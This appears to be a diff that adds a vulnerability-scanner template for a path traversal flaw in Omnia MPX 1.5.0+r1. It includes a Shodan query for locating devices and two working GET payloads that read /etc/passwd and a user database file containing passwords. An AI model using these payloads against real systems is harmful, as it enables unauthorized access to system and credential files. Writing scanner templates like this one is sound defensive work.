@@ -1,0 +1,33 @@
+id: omnia-mpx-lfi
+info:
+  author: arafatansari,ritikchaddha
+  description: 'Omnia MPX 1.5.0+r1 is vulnerable to Path Traversal.
+
+    '
+  metadata:
+    shodan-query: http.html:"Omnia MPX"
+    verified: true
+  name: Omnia MPX 1.5.0+r1 - Path Traversal
+  reference:
+  - https://www.exploit-db.com/exploits/50996
+  severity: high
+  tags: lfi,omnia,mpx,traversal
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"username":'
+    - '"password":'
+    - '"mustChangePwd":'
+    - '"roleUser":'
+  matchers-condition: or
+  method: GET
+  path:
+  - '{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd'
+  - '{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json'
+  stop-at-first-match: true
